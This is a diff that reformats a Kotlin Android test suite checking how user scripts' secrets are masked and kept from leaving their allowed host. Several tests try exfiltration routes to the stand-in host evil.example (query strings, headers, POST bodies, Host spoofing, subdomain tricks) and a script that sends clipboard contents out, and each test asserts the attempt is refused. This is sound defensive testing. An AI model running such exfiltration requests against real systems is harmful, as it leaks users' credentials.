@@ -2,8 +2,8 @@ package com.mtwabpin.kolahal.script
 
 import androidx.test.ext.junit.runners.AndroidJUnit4
 import androidx.test.platform.app.InstrumentationRegistry
-import com.mtwabpin.kolahal.data.ScriptLang
 import com.mtwabpin.kolahal.data.KvStore
+import com.mtwabpin.kolahal.data.ScriptLang
 import com.mtwabpin.kolahal.data.ScriptRepository
 import okhttp3.HttpUrl.Companion.toHttpUrl
 import org.junit.After
@@ -28,7 +28,8 @@ class ScriptSecretsTest {
     private val value = "s3cr3t-value-123"
     private val key = ScriptMeta.Secret("KEY", listOf("api.example.com"), "")
 
-    @After fun tearDown() {
+    @After
+    fun tearDown() {
         scripts.byName("secrets-test")?.let { scripts.delete(it.id) }
         store.clear("secrets-test")
     }
@@ -53,14 +54,16 @@ class ScriptSecretsTest {
      * (Android's own Keystore error, which says which it is, can't be made in a test: its
      * constructors are hidden.)
      */
-    @Test fun onlyTheKeysOwnFailureStartsOver() {
+    @Test
+    fun onlyTheKeysOwnFailureStartsOver() {
         assertFalse(SecretStore.mayPass(java.security.UnrecoverableKeyException("the key is damaged")))
         assertFalse(SecretStore.mayPass(java.io.IOException("something else")))
         store.set("secrets-test", "KEY", value, key.hosts)
         assertEquals(value, store.get("secrets-test", "KEY")?.value)
     }
 
-    @Test fun aScriptGetsAMarkNotTheValue() {
+    @Test
+    fun aScriptGetsAMarkNotTheValue() {
         val h = host()
         val mark = h.secretGet("KEY")!!
         assertFalse(value in mark)
@@ -69,29 +72,65 @@ class ScriptSecretsTest {
         assertEquals("Bearer ••••", h.redact("Bearer $mark"))
         assertEquals("••••", h.redact(value))
         // Unset: nil, as before.
-        assertNull(HostApi(context, "secrets-test", null, false, secrets = HostApi.Secrets(listOf(key), emptyMap())).secretGet("KEY"))
+        assertNull(
+            HostApi(
+                context,
+                "secrets-test",
+                null,
+                false,
+                secrets = HostApi.Secrets(listOf(key), emptyMap())
+            ).secretGet("KEY")
+        )
     }
 
-    @Test fun theValueGoesInOnlyForItsSiteOverHttps() {
+    @Test
+    fun theValueGoesInOnlyForItsSiteOverHttps() {
         val h = host()
         val mark = h.secretGet("KEY")!!
-        assertEquals("Bearer $value", h.fillSecrets("Bearer $mark", "https://api.example.com/user".toHttpUrl()))
-        assertEquals("k=$value", h.fillSecrets("k=$mark", "https://eu.api.example.com/".toHttpUrl()))
-        refused<java.io.IOException>("may only be sent to") { h.fillSecrets("k=$mark", "https://evil.example/".toHttpUrl()) }
-        refused<java.io.IOException>("over https") { h.fillSecrets("k=$mark", "http://api.example.com/".toHttpUrl()) }
+        assertEquals(
+            "Bearer $value",
+            h.fillSecrets("Bearer $mark", "https://api.example.com/user".toHttpUrl())
+        )
+        assertEquals(
+            "k=$value",
+            h.fillSecrets("k=$mark", "https://eu.api.example.com/".toHttpUrl())
+        )
+        refused<java.io.IOException>("may only be sent to") {
+            h.fillSecrets(
+                "k=$mark",
+                "https://evil.example/".toHttpUrl()
+            )
+        }
+        refused<java.io.IOException>("over https") {
+            h.fillSecrets(
+                "k=$mark",
+                "http://api.example.com/".toHttpUrl()
+            )
+        }
         // Changed or hidden, a mark is just text: the value never goes in.
         val reversed = mark.reversed()
         assertEquals(reversed, h.fillSecrets(reversed, "https://evil.example/".toHttpUrl()))
     }
 
     /** Requests are refused before anything is sent. */
-    @Test fun requestsCarryingAMarkElsewhereAreRefused() {
+    @Test
+    fun requestsCarryingAMarkElsewhereAreRefused() {
         val h = host()
         val mark = h.secretGet("KEY")!!
         refused<java.io.IOException>("may only be sent to") { h.httpGet("https://evil.example/?k=$mark") }
-        refused<java.io.IOException>("may only be sent to") { h.httpGet("https://evil.example/", mapOf("Authorization" to "Bearer $mark")) }
+        refused<java.io.IOException>("may only be sent to") {
+            h.httpGet(
+                "https://evil.example/",
+                mapOf("Authorization" to "Bearer $mark")
+            )
+        }
         refused<java.io.IOException>("over https") { h.httpGet("http://api.example.com/?k=$mark") }
-        refused<IllegalArgumentException>("Host header") { h.httpGet("https://api.example.com/", mapOf("Host" to "evil.example")) }
+        refused<IllegalArgumentException>("Host header") {
+            h.httpGet(
+                "https://api.example.com/",
+                mapOf("Host" to "evil.example")
+            )
+        }
         refused<java.io.IOException>("may only be sent to") {
             h.httpRequest("https://evil.example/", method = "POST", body = "{\"k\":\"$mark\"}")
         }
@@ -108,7 +147,8 @@ class ScriptSecretsTest {
                     while (reader.readLine()?.isNotEmpty() == true) Unit
                     answering()
                     val bytes = body.toByteArray()
-                    c.getOutputStream().write("HTTP/1.1 200 OK\r\nContent-Length: ${bytes.size}\r\nConnection: close\r\n\r\n".toByteArray() + bytes)
+                    c.getOutputStream()
+                        .write("HTTP/1.1 200 OK\r\nContent-Length: ${bytes.size}\r\nConnection: close\r\n\r\n".toByteArray() + bytes)
                 }
             }
         }
@@ -117,12 +157,18 @@ class ScriptSecretsTest {
             block(url)
         } finally {
             socket.close()
-            listOf("http.cache:", "rss.seen:").forEach { KvStore(context, "repl").deleteStartingWith(it) }
+            listOf("http.cache:", "rss.seen:").forEach {
+                KvStore(
+                    context,
+                    "repl"
+                ).deleteStartingWith(it)
+            }
         }
     }
 
     /** A store goes into backups: a site sending the key back must not put it there. */
-    @Test fun aResponseHoldingASecretIsntCached() {
+    @Test
+    fun aResponseHoldingASecretIsntCached() {
         val body = "{\"next\":\"https://api.example.com/?key=$value\"}"
         serving(body) { url ->
             val h = host()
@@ -138,10 +184,18 @@ class ScriptSecretsTest {
     }
 
     /** An answer that comes once the run has ended (JavaScript's http.cached, not awaited) isn't kept. */
-    @Test fun anAnswerAfterTheRunEndedIsntCached() {
+    @Test
+    fun anAnswerAfterTheRunEndedIsntCached() {
         val asked = java.util.concurrent.CountDownLatch(1)
         val ended = java.util.concurrent.CountDownLatch(1)
-        serving("{\"late\":1}", answering = { asked.countDown(); ended.await(5, java.util.concurrent.TimeUnit.SECONDS) }) { url ->
+        serving(
+            "{\"late\":1}",
+            answering = {
+                asked.countDown(); ended.await(
+                5,
+                java.util.concurrent.TimeUnit.SECONDS
+            )
+            }) { url ->
             val h = host()
             val call = kotlin.concurrent.thread { runCatching { h.httpCached(url, 60) } }
             assertTrue(asked.await(5, java.util.concurrent.TimeUnit.SECONDS))
@@ -155,12 +209,16 @@ class ScriptSecretsTest {
     }
 
     /** One kept before these stayed out goes the next time the script asks, fresh or not, and isn't handed back. */
-    @Test fun aResponseCachedWithASecretGoes() {
+    @Test
+    fun aResponseCachedWithASecretGoes() {
         val plain = "{\"plain\":1}"
         serving(plain) { url ->
             val h = host()
             val kept = KvStore(context, "repl")
-            kept.set("http.cache:$url", Json.stringify(mapOf("at" to System.currentTimeMillis(), "body" to "key=$value")))
+            kept.set(
+                "http.cache:$url",
+                Json.stringify(mapOf("at" to System.currentTimeMillis(), "body" to "key=$value"))
+            )
             val answer = h.httpCached(url, 60)
             assertEquals(false, answer["cached"])
             assertEquals(plain, answer["body"])
@@ -168,9 +226,10 @@ class ScriptSecretsTest {
         }
     }
 
-    @Test fun aFeedItemsSecretIsMaskedAndTheItemStillSeen() {
+    @Test
+    fun aFeedItemsSecretIsMaskedAndTheItemStillSeen() {
         val rss = "<rss version=\"2.0\"><channel><title>t</title><item><title>a</title>" +
-            "<link>https://example.com/a?token=$value</link><guid>https://example.com/a?token=$value</guid></item></channel></rss>"
+                "<link>https://example.com/a?token=$value</link><guid>https://example.com/a?token=$value</guid></item></channel></rss>"
         serving(rss) { url ->
             val first = host()
             assertEquals(1, (first.rssFresh(url)["items"] as List<*>).size)
@@ -182,7 +241,8 @@ class ScriptSecretsTest {
         }
     }
 
-    @Test fun clipboardAndStoreNeverTakeASecret() {
+    @Test
+    fun clipboardAndStoreNeverTakeASecret() {
         val h = host()
         val mark = h.secretGet("KEY")!!
         refused<IllegalArgumentException>("secrets") { h.clipboardSet("key: $mark") }
@@ -192,7 +252,8 @@ class ScriptSecretsTest {
     }
 
     /** New code without an `@secret` line forgets its value instead of keeping it unseen. */
-    @Test fun aRemovedSecretIsForgotten() {
+    @Test
+    fun aRemovedSecretIsForgotten() {
         val two = "-- @secret A api.example.com one\n-- @secret B api.example.com two\nreturn 1"
         val s = scripts.create("secrets-test", ScriptLang.LUA, two)
         val (a, b) = ScriptMeta.secrets(two)
@@ -204,10 +265,18 @@ class ScriptSecretsTest {
     }
 
     /** Code you didn't write that starts making requests starts with the internet off, and says so. */
-    @Test fun anUpdateThatGoesOnlineStartsWithInternetOff() {
-        val s = scripts.create("secrets-test", ScriptLang.LUA, "-- @uses clipboard\nreturn clipboard.get()")
+    @Test
+    fun anUpdateThatGoesOnlineStartsWithInternetOff() {
+        val s = scripts.create(
+            "secrets-test",
+            ScriptLang.LUA,
+            "-- @uses clipboard\nreturn clipboard.get()"
+        )
         scripts.setAccess(s.id, "clipboard", true)
-        scripts.saveCode(s.id, "-- @uses clipboard\nreturn http.get('https://example.com/?c=' .. clipboard.get())")
+        scripts.saveCode(
+            s.id,
+            "-- @uses clipboard\nreturn http.get('https://example.com/?c=' .. clipboard.get())"
+        )
         assertFalse(scripts.byId(s.id)!!.grants.allows(ScriptAccess.INTERNET))
         scripts.setAccess(s.id, ScriptAccess.INTERNET, true)
         assertTrue(scripts.byId(s.id)!!.grants.allows(ScriptAccess.INTERNET))
@@ -222,19 +291,33 @@ class ScriptSecretsTest {
      * `https://<mark>.api.example.com` ends in the allowed site, but the value would go to the
      * address lookup in plain text, and the lookup's error would hand it to the script.
      */
-    @Test fun aMarkCantBePartOfTheSitesName() {
+    @Test
+    fun aMarkCantBePartOfTheSitesName() {
         val h = host()
         val mark = h.secretGet("KEY")!!
         refused<java.io.IOException>("part of a site's name") { h.httpGet("https://$mark.api.example.com/") }
         refused<java.io.IOException>("part of a site's name") { h.httpGet("https://user:$mark@api.example.com/") }
-        refused<java.io.IOException>("part of a site's name") { h.fillSecrets("k=$mark", "https://$mark.api.example.com/".toHttpUrl()) }
+        refused<java.io.IOException>("part of a site's name") {
+            h.fillSecrets(
+                "k=$mark",
+                "https://$mark.api.example.com/".toHttpUrl()
+            )
+        }
     }
 
     /** OkHttp quotes a header value it refuses: what the script catches, in either language, holds no secret. */
-    @Test fun aFailedRequestsErrorHoldsNoValue() {
+    @Test
+    fun aFailedRequestsErrorHoldsNoValue() {
         // Outside ASCII, so OkHttp refuses it in a header, quoting it.
         val odd = "kéy-value-123"
-        fun oddHost() = HostApi(context, "secrets-test", scriptId = null, notifyEnabled = false, secrets = HostApi.Secrets(listOf(key), mapOf("KEY" to odd)))
+        fun oddHost() = HostApi(
+            context,
+            "secrets-test",
+            scriptId = null,
+            notifyEnabled = false,
+            secrets = HostApi.Secrets(listOf(key), mapOf("KEY" to odd))
+        )
+
         val h = oddHost()
         try {
             h.httpGet("https://api.example.com/", mapOf("X-Key" to h.secretGet("KEY")))
@@ -244,12 +327,24 @@ class ScriptSecretsTest {
             assertTrue(e.message, "X-Key value: ••••" in e.message.orEmpty())
         }
         val lua = kotlinx.coroutines.runBlocking {
-            LuaEngine().run("""local ok, err = pcall(http.get, "https://api.example.com/", { ["X-Key"] = secrets.get("KEY") }); return err""", "t", oddHost(), 5_000, false)
+            LuaEngine().run(
+                """local ok, err = pcall(http.get, "https://api.example.com/", { ["X-Key"] = secrets.get("KEY") }); return err""",
+                "t",
+                oddHost(),
+                5_000,
+                false
+            )
         }.orEmpty()
         assertFalse(lua, odd in lua)
         assertTrue(lua, "••••" in lua)
         val js = kotlinx.coroutines.runBlocking {
-            JsEngine().run("""try { await http.get("https://api.example.com/", { "X-Key": secrets.get("KEY") }); return "sent" } catch (e) { return String(e.message || e) }""", "t", oddHost(), 5_000, false)
+            JsEngine().run(
+                """try { await http.get("https://api.example.com/", { "X-Key": secrets.get("KEY") }); return "sent" } catch (e) { return String(e.message || e) }""",
+                "t",
+                oddHost(),
+                5_000,
+                false
+            )
         }.orEmpty()
         assertFalse(js, odd in js)
         assertTrue(js, "••••" in js)
